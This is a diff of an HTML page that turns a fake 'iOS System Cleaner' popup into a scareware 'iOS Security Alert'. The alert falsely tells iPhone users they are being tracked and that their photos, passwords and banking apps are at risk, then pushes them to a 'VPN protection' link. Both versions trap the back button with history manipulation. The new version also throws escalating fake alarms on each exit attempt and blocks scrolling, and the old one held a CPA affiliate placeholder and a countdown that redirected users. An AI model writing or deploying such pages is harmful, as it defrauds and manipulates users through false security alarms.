@@ -1,117 +1,176 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>iOS System Cleaner</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>iOS Security Alert</title>
   <style>
-    body {
+    * {
       margin: 0;
-      background: #fefefe;
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      padding: 0;
+      box-sizing: border-box;
+      -webkit-tap-highlight-color: transparent;
     }
-    .modal {
-      max-width: 360px;
-      margin: 80px auto;
-      padding: 25px 20px;
-      background: white;
-      border-radius: 14px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: #f2f2f2;
+      color: #111;
+      height: 100vh;
+      overflow: hidden;
+      touch-action: manipulation;
+      user-select: none;
+      -webkit-user-select: none;
+    }
+
+    .alert-container {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      background: rgba(0,0,0,0.6);
+      z-index: 9999;
+    }
+
+    .alert-box {
+      background: #fff;
+      border: 2px solid #ff3b30;
+      border-radius: 18px;
+      padding: 25px;
+      max-width: 400px;
       text-align: center;
-      border: 1px solid #ddd;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.2);
     }
-    .modal img {
+
+    .alert-icon {
       width: 60px;
+      height: 60px;
       margin-bottom: 15px;
     }
-    .modal h2 {
+
+    h1 {
       font-size: 18px;
-      font-weight: 600;
-      color: #111;
-      margin-bottom: 10px;
+      color: #d10000;
+      margin-bottom: 12px;
     }
-    .modal p {
-      font-size: 16px;
+
+    p {
+      font-size: 15px;
+      line-height: 1.5;
       color: #333;
     }
-    .timer {
-      margin: 15px 0;
-      color: red;
-      font-weight: 600;
+
+    .btn-group {
+      margin-top: 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
     }
+
     .btn {
-      display: inline-block;
-      font-size: 16px;
-      padding: 12px 25px;
+      padding: 14px;
       border-radius: 12px;
+      font-size: 16px;
+      font-weight: 500;
       border: none;
-      margin: 10px 5px 0;
       cursor: pointer;
     }
-    .btn.cancel {
-      background-color: #e5e5ea;
+
+    .btn-install {
+      background: #007aff;
+      color: #fff;
+    }
+
+    .btn-install:active {
+      opacity: 0.9;
+    }
+
+    .btn-cancel {
+      background: #e5e5ea;
       color: #111;
     }
-    .btn.update {
-      background-color: #007aff;
-      color: white;
+
+    .btn-cancel:active {
+      background: #d1d1d6;
+    }
+
+    .exit-attempts {
+      margin-top: 10px;
+      font-size: 13px;
+      color: #ff3b30;
+    }
+
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      25% { transform: translateX(-8px); }
+      50% { transform: translateX(8px); }
+      75% { transform: translateX(-8px); }
     }
   </style>
 </head>
 <body>
-  <div class="modal">
-    <img src="https://cdn-icons-png.flaticon.com/512/565/565547.png" alt="Warning Icon" />
-    <h2>System Cleanup Required</h2>
-    <p>Your iPhone may be running low on storage.<br>
-       System cache and temporary files should be removed for better performance.</p>
-    <p>Cleaner Utility is recommended.</p>
-    <div class="timer" id="countdown">4 minutes 59 seconds</div>
-    <div>
-      <button class="btn cancel" id="cancelBtn">Cancel</button>
-      <button class="btn update" id="updateBtn">Update Now</button>
+  <div class="alert-container" id="alertContainer">
+    <div class="alert-box" id="alertBox">
+      <img src="https://cdn-icons-png.flaticon.com/512/753/753345.png" class="alert-icon" alt="Alert">
+      <h1>System Security Alert ⚠️</h1>
+      <p><strong>Your iPhone is being tracked!</strong></p>
+      <p>Suspicious behavior has been detected from scammers.</p>
+      <p>They may access:<br>• Photos<br>• Passwords<br>• Banking apps</p>
+
+      <div class="btn-group">
+        <button class="btn btn-install" onclick="window.location.href='https://antivirus-browser.netlify.app/'">
+          🔒 INSTALL VPN PROTECTION NOW
+        </button>
+        <button class="btn btn-cancel" id="cancelBtn">
+          CANCEL (RISKY)
+        </button>
+      </div>
+      <div class="exit-attempts" id="exitAttempts">Exit attempts: 0 / 7</div>
     </div>
   </div>
 
   <script>
-    window.onload = function () {
-      const offerLink = "https://your-ios-smartlink.com"; // 🔁 Replace with your iOS CPA URL
+    let attempts = 0;
+    const maxAttempts = 7;
+    const cancelBtn = document.getElementById('cancelBtn');
+    const exitAttemptsText = document.getElementById('exitAttempts');
+    const alertBox = document.getElementById('alertBox');
 
-      document.getElementById("updateBtn").onclick = function () {
-        window.location.href = offerLink;
-      };
-
-      document.getElementById("cancelBtn").onclick = function () {
-        alert("Cleanup is still recommended to free up space and improve speed.");
-      };
-
-      // Light back trap (iOS-safe)
-      history.pushState(null, "", location.href);
-      window.addEventListener("popstate", function () {
-        alert("⚠️ Warning: Your iOS system needs optimization.");
-        history.pushState(null, "", location.href);
-      });
-
-      // Countdown timer
-      let minutes = 4;
-      let seconds = 59;
-      const timerDisplay = document.getElementById("countdown");
-
-      const timer = setInterval(() => {
-        if (seconds === 0) {
-          if (minutes === 0) {
-            clearInterval(timer);
-            timerDisplay.innerText = "Redirecting...";
-            window.location.href = offerLink;
-            return;
-          }
-          minutes--;
-          seconds = 59;
-        } else {
-          seconds--;
-        }
-        timerDisplay.innerText = `${minutes} minute${minutes !== 1 ? 's' : ''} ${seconds} second${seconds !== 1 ? 's' : ''}`;
-      }, 1000);
+    history.pushState(null, null, location.href);
+    window.onpopstate = function () {
+      history.pushState(null, null, location.href);
+      handleExitAttempt();
     };
+
+    function handleExitAttempt() {
+      attempts++;
+      if (attempts <= maxAttempts) {
+        const messages = [
+          "iOS Security Risk Detected!",
+          "Location Tracking Active!",
+          "Bank Info Compromised!",
+          "Immediate VPN Protection Needed!",
+          "Critical: iCloud Access Risk!",
+          "Final Warning: Stop Exit!",
+          "You're at maximum risk!"
+        ];
+        alert(`⚠️ ${messages[attempts - 1]}`);
+        exitAttemptsText.textContent = `Exit attempts: ${attempts} / ${maxAttempts}`;
+        alertBox.style.animation = "shake 0.4s";
+        setTimeout(() => alertBox.style.animation = "", 500);
+      } else {
+        window.location.href = "about:blank"; // Let them exit
+      }
+    }
+
+    cancelBtn.addEventListener('click', handleExitAttempt);
+
+    document.addEventListener('touchmove', function (e) {
+      e.preventDefault();
+    }, { passive: false });
   </script>
 </body>
 </html>
